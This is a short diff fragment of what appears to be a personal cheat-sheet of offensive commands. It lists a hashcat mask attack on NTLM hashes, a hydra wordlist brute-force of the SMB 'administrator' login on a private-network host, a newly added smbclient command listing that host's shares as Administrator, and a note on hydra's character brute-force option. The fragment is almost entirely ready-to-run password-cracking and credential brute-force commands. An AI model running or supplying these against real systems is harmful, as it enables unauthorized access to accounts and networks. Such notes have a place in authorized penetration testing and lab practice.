@@ -26,6 +26,8 @@ hashcat --force --hwmon-temp-abort=100 -m 1000 -D 1,2 -a 3 -i --increment-min 5 
 
 hydra -P wifite.txt -l administrator smb://192.168.50.200 -m "ROOT.DC"
 
+smbclient -L 192.168.50.200 -U Administrator
+
 
 Brute char!!!! -x min:max:Aa1%
 
